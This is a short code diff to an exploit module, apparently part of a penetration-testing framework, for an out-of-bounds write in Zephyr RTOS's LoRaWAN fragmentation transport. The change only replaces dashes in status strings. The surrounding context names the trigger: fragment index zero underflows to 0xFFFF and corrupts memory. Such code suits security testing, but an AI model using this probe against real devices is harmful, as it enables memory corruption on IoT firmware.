@@ -70,7 +70,7 @@ class Exploit(Exploit):
         "devices": ("Zephyr RTOS 3.7.0-4.4.x with LoRaWAN frag transport",),
     }
 
-    dry_run = OptBool(True, "Dry run — show payload only")
+    dry_run = OptBool(True, "Dry run  -  show payload only")
     session_cnt = OptInteger(1, "LoRaWAN fragmentation session counter")
 
     @mute
@@ -82,7 +82,7 @@ class Exploit(Exploit):
         sc = int(self.session_cnt)
 
         payload = _build_frag_fragment_zero(app_session_cnt=sc)
-        print_status(f"LoRaWAN frag_transport OOB probe — {_CVE}")
+        print_status(f"LoRaWAN frag_transport OOB probe  -  {_CVE}")
         print_info(f"Payload ({len(payload)} bytes): {payload.hex()}")
         print_info("frag_index_n=0 triggers underflow (0-1=0xFFFF) → OOB write in MatrixM2B")
 
